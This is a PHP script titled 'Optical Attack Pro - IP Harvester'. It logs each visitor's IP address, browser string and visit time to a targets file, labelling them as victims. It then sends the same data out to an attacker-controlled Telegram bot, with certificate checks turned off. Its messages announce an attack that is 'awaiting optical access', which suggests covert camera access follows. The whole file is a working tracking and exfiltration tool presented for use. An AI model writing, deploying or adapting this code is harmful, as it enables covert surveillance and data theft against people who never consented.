<?php
// Optical Attack Pro - IP Harvester
// Made by Ahsan

// Get victim IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Save locally
$file = 'targets.txt';
$fp = fopen($file, 'a');
fwrite($fp, "═══════════════════════════════════════\n");
fwrite($fp, "TARGET DETECTED\n");
fwrite($fp, "───────────────────────────────────────\n");
fwrite($fp, "IP: $ipaddress\n");
fwrite($fp, "Browser: $useragent\n");
fwrite($fp, "Time: $timestamp\n");
fwrite($fp, "═══════════════════════════════════════\n\n");
fclose($fp);

// ===== TELEGRAM CONFIGURATION =====
define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE');
define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID_HERE');

// Send Telegram notification
$message = "🎯 *OPTICAL ATTACK INITIATED*\n\n" .
           "📍 *Target Detected*\n" .
           "🔹 IP: `" . $ipaddress . "`\n" .
           "🔹 Browser: `" . substr($useragent, 0, 45) . "`\n" .
           "🔹 Time: `" . $timestamp . "`\n" .
           "🔹 Status: ⏳ Awaiting optical access...\n\n" .
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" .
           "*Optical Attack Pro v1.0*\n" .
           "Made by Ahsan\n" .
           "#OpticalAttack #TargetAcquired";

$telegramUrl = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => $telegramUrl,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => array(
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 5
));

@curl_exec($ch);
curl_close($ch);

?>
